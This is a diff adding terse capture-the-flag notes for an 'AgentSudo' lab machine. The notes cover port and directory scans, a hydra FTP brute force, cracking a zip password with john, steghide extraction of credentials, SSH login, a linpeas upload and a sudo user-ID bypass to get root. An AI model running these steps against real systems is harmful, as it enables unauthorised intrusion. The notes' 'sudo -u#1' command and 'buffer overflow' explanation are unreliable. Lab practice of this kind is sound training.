@@ -222,5 +222,93 @@ Cyborg
 	cat root/root.txt
 
 ====================================================================================================
+AgentSudo
+
+	Nmap scan, port 80,21,22 ports are open
+	visit website, view page source
+	Do nikto scan
+	Do gobuster scan to find subdirectories
+	curl "http://10.10.173.151" -H "User-Agent:C" -L
+
+	>hydra -l chris -p /path/to/rockyou.txt ftp:10.10.173.151
+	foound credential chris/crystal
+
+	>ftp 10.10.173.151  --> enter username & password- > Login success
+	//download all files
+	ftp>mget *
+	cat the downloaded txt file to get clues
+	
+	//find anything is there in jpg files
+	>strings*.jpg
+	>strings*.png
+
+	binwalk -e cute.png  //extract the files inside image
+	navigate inside the extracted folder
+
+	//unzip the zip files
+	>unzip 8702.zip
+	
+	>7z e 8702.zip   //need password
+
+	>/opt/jhonTheRipper/run/Zip2john 8702.zip    //we see some hash value
+	>/opt/jhonTheRipper/run/Zip2john 8702.zip > hashes_for_john.txt
+	>/opt/jhonTheRipper/run/john hashes_for_john.txt --wordlist=/opt/rockyou.txt   -> Found password
+
+	>7z e 8702.zip  //enter password
+
+	>cat To_agentR.txt   //to check any info , Found some encrypted value, its random Upper case alphabet, may be Base64
+	>echo QXJlYTUx | base64 -d    -> found decrypted value
+	
+	>steghide extract -sf cute-alien.jpg   // enter password we got e from decrypted, after password enter got jpg file extracted
+
+	>ls // Found some txt file, cat displayed password & user james
+
+	//Try to ssh
+	>ssh james@10.10.173.151   //enter password we found above -->login success
+	james@ >ls //search for any flag files  --> found flag
+
+	//from other terminal bash , where we downloaded files
+	//search for any strings inside Alien_autospy.jpg
+	>strings Alien_autospy.jpg   //not found any useful info
+	>exiftool Alien_autospy.jpg //not found any useful info
+
+	image base search in google
+
+	scp-> secured copy protocol
+	SCP Command Syntax--> scp [OPTION] [user@]SRC_HOST:]file1 [user@]DEST_HOST:]file2
+
+	scp james@10.10.173.151:/Alien_autospy.jpg .
+	>eog Alien_autospy.jpg  //opens image file
+	
+	>strings Alien_autospy.jpg  // to find anything interest info
+	>exiftool Alien_autospy.jpg  // to find anything interest info
+
+	Google image search   //upload this image and found some information about event
+
+	//privilege-escalation-awesome-scripts-suite
+	Download this linpeas.sh tool from   https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh
+	
+	scp /opt/linpeas.sh james@10.10.173.151:/dev/shm
+	
+	james@agent-sudo:$ cd /dev/shm
+	james@agent-sudo:/dev/shm$ls  //linpeas.sh
+	
+	$chmod +x linpeas.sh
+	$./linpeas.sh
+
+	$sshpass -p "hackerrles!" ssh james@10.10.173.151
+	$sudo -l   //found (ALL, !root)  /bin/bash
+
+	$ sudo -u#1 /bin/bash    //which buffer overflows and make privilege as root, here user id -1 does not exists
+	After execute above command , switched to root@agent-sudo:# 
+	root@agent-sudo:# ls  // found user_flag.txt
+	
+	root@agent-sudo:# cd /root
+	root@agent-sudo:# ls  //root.txt
+	root@agent-sudo:# /root#cat root.txt   //found flag
+
+
+
+======================================================================================
 	
 
